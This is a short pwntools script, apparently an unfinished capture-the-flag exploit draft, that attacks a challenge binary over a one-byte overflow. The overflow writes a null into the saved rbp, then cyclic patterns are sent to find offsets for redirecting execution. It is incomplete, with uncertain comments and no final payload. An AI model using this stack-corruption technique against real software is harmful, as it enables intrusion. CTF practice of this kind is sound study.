#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
            
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    if True:
        gdb.attach(r)
        pause()
    
    r.clean()

    # First getname
    r.sendline(b"x"*8)
    # 1 byte overflow, 00 into last byte of rbp

    r.clean()
    print(cyclic_find('gaaa'))
    r.sendline(cyclic(60))
    # AAddr it returns to (?)
    r.clean()
    r.sendline(b'x'*8) 
    # Then corrupt rbp again to return to second payload



    r.interactive()


if __name__ == "__main__":
    main()
